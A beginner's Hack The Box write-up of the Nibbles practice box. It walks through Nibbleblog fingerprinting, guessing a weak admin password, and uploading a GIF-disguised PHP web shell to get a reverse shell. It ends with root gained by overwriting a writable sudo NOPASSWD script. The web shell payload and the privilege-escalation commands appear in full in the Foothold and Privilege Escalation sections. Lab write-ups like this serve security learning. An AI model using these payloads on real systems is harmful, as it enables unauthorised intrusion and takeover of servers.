---
title: "HTB Writeup: Nibbles"
date: 2026-08-02
---

# Nibbles

This is my first box ever, and after following the steps on the Getting Started module on HTB Academy and solving the box, I looked for other writeups and videos for more understanding. So this writeup is inspired by many other blogs, and one of the ones I look up to, IppSec.

## Recon

Started with an nmap scan against the target, which turned up two open ports: SSH and HTTP. With a web server in play, the next step was to actually look at what was being served.

Using Burp Suite to inspect the HTTP response headers, I was able to identify that the site was running **Nibbleblog**, a lightweight blogging platform.

## Enumeration

Once I knew the platform, the natural next question was: *which version?* Fingerprinting the exact version matters because exploits are usually version-specific, running the wrong one against the wrong version just wastes time or triggers detection.

I downloaded the latest Nibbleblog source and compared file/folder structures and version strings against what the target was serving, which let me pin down the exact version running.

With the version confirmed, I ran:

```bash
searchsploit nibbleblog
```

This returned two exploits. I mirrored both locally and read through them manually rather than firing them off with Metasploit. Reading the exploit code mattered here for two reasons: not every target has a ready-made Metasploit module, so building the habit of understanding what an exploit is actually doing is more transferable than memorizing `use exploit/...` commands. It's also generally quieter than a Metasploit payload, which is more heavily fingerprinted by AV/EDR in real-world engagements.

One of the two exploits turned out to be outdated; the other matched.

## Gaining Access

The working exploit required **authenticated access**, specifically, the ability to upload a file through Nibbleblog's "My Image" upload feature. So the next step was finding a way to log in.

Poking around the site further, I found a `/private` directory that revealed a username: `admin`.

My first instinct was to brute-force the password with Hydra against the rockyou.txt wordlist, which got me blacklisted almost immediately. Lesson learned: **don't brute-force login forms with Hydra unless you're confident about lockout/blacklist behavior first.**

After that, I guessed the password manually, and it turned out to be the same as the username pattern (`nibbles`), a good reminder to always check for default or weak credentials before reaching for automation.

## Foothold

With admin access, I uploaded a malicious `cmd.php` file through the image upload feature:

```php
GIF8;
<?php echo system($_REQUEST['id']); ?>
```

The `GIF8;` header at the top is a small but important trick, it makes the file's magic bytes look like a real GIF image, in case there's any file-type validation happening beyond just the extension.

After uploading successfully, I opened Burp Suite's Repeater to interact with the shell. I changed the request method to POST and modified the `id` parameter to trigger a full reverse shell payload from the PentestMonkey PHP reverse shell cheat sheet, rather than just running one-off commands like `whoami`.

Before sending the payload, I confirmed `nc` was available on the target:

```
id=which nc
→ /bin/nc
```

Then set up a local listener:

```bash
nc -lvnp 9001
```

Triggered the payload through Repeater, and got a shell back as the `nibbler` user.

## Privilege Escalation

The first thing to check on any box once you have a shell is:

```bash
sudo -l
```

This revealed that `nibbler` could run one specific script as root, with no password required:

```
(root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
```

The key insight here: **sudo doesn't care what's inside the file, it just executes whatever's sitting at that exact path as root.**

Looking around nibbler's home directory, I noticed a `personal.zip` file. Unzipping it revealed the exact path structure sudo was expecting:

```bash
unzip personal.zip
```

```
Archive:  personal.zip
   creating: personal/
   creating: personal/stuff/
  inflating: personal/stuff/monitor.sh
```

The `monitor.sh` inside was a pre-existing monitoring script, owned by the `nibbler` user and **writable**. Since sudo would run this exact file as root regardless of its contents, all I had to do was overwrite it with something more useful than a monitoring script:

```bash
echo "bash" > personal/stuff/monitor.sh
```

Made sure it had a proper shebang line and was executable:

```bash
chmod +x personal/stuff/monitor.sh
```

Then ran it with sudo:

```bash
sudo ./personal/stuff/monitor.sh
```

This dropped me into a shell running as root.

**Funny moment:** when I went to grab the flag, I tried to copy it out of the reverse shell terminal and instinctively hit `Ctrl+C` instead of `Ctrl+Shift+C`, which, in a terminal, doesn't copy anything, it sends an interrupt signal. That killed my shell connection on the spot. Luckily the flag was already printed on screen before the connection dropped, so no harm done, but it was a genuine "wait, what if I'd done that mid-privesc instead of at the very end" moment. If it had happened a few steps earlier, I'd have had to restart the whole exploitation chain from the reverse shell step, all because of one muscle-memory keybind mixup. Small reminder to slow down at the finish line just as much as at the start.

**A note on IppSec's approach:** watching IppSec's video afterward for more understanding, I noticed he took a slightly different route to the same result, he didn't unzip `personal.zip` (seemingly missed it) and instead just ran `mkdir -p personal/stuff` to recreate the exact path manually, then wrote his own `monitor.sh` from scratch at that location. Since sudo only cares about the path, not whether the file already existed, both approaches hit the exact same misconfiguration and land at root the same way. It's a good reminder that there's often more than one valid path to the same result, and understanding *why* an exploit works matters more than memorizing one exact sequence of commands.

## Appendix: Full Attack Chain (IppSec's Walkthrough)

For quick reference, here's the full path condensed into a single chain, following IppSec's video from recon to root:

```
nmap scan → found HTTP (port 80) + SSH
  → Burp Suite to inspect HTTP response headers
  → found site is running Nibbleblog (via headers/response)
  → downloaded latest Nibbleblog source to compare version
  → identified exact version running on target
  → searchsploit nibbleblog → found 2 exploits, mirrored both
  → read exploit code manually instead of using Metasploit
  → exploit requires authenticated access (upload via "my image" section)
  → found /private directory → discovered admin username
  → hydra + rockyou.txt to bruteforce login → got blacklisted (lesson: avoid hydra without care)
  → guessed password manually instead → logged in successfully
  → uploaded cmd.php disguised as GIF8; header to bypass filtering
  → used Burp Repeater, changed request to POST, modified parameter to trigger reverse shell (pentestmonkey cheat sheet)
  → checked nc was available on target (which nc) before uploading payload
  → opened local listener: nc -lvnp 9001
  → triggered payload via Repeater → got shell as nibbler
  → sudo -l → found nibbler can run /home/nibbler/personal/stuff/monitor.sh as root, NOPASSWD
  → didn't unzip personal.zip (missed it)
  → mkdir -p personal/stuff (creates full path)
  → echo "bash" > monitor.sh, edited with vi to add #!/bin/sh shebang
  → chmod +x monitor.sh
  → sudo ./monitor.sh → root shell obtained
```

## Lessons Learned

- **Read exploit code before running it.** Understanding what a payload actually does builds skills that transfer to boxes without ready-made modules.
- **Be careful with automated brute-forcing.** Hydra got me blacklisted on my first real attempt, always consider lockout policies before reaching for automation.
- **sudo trusts the path, not the file's history.** If you can write to a path sudo will execute as root, the file doesn't need to have existed beforehand or have "special" contents ,  it just needs to do something useful when it runs.
- **First box, first real troubleshooting.** Between mismatched ports on my Python HTTP server and a listener dying mid-transfer, most of my actual learning happened in the debugging, not in the clean parts of the walkthrough.